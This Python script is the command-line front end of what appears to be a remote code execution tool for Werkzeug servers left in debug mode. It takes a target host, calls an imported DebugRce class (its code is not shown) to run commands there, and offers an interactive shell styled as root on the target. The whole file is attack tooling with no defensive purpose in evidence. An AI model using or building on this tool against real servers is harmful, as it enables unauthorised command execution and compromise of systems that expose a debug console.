#!/usr/bin/env python
'''Werkzeug debug-enabled rce tool'''

from argparse import ArgumentParser
from sys import exit as sysexit

from lib.werkzeug_rce import DebugRce

if __name__ == '__main__':

	parser = ArgumentParser()
	parser.add_argument('-t', '--host', type=str,
						required=True, help='Target host to test')
	parser.add_argument('-c', '--cmd', type=str, help='Cmd to inject')
	args = parser.parse_args()

	d = DebugRce(args.host)
	if args.cmd:
		if args.cmd == 'clear':
			print("\033[H\033[J", end="")
		for line in d.exec(args.cmd):
			print(line)

	while True:
		try:
			cmd = input(f'root@{args.host}:~$ ')
			if cmd == 'clear':
				print("\033[H\033[J", end="")
			elif cmd == 'exit':
				print('\nQuitting!')
				sysexit()
			for line in d.exec(cmd):
				print(line)
		except KeyboardInterrupt:
			print('\nQuitting!')
			sysexit()
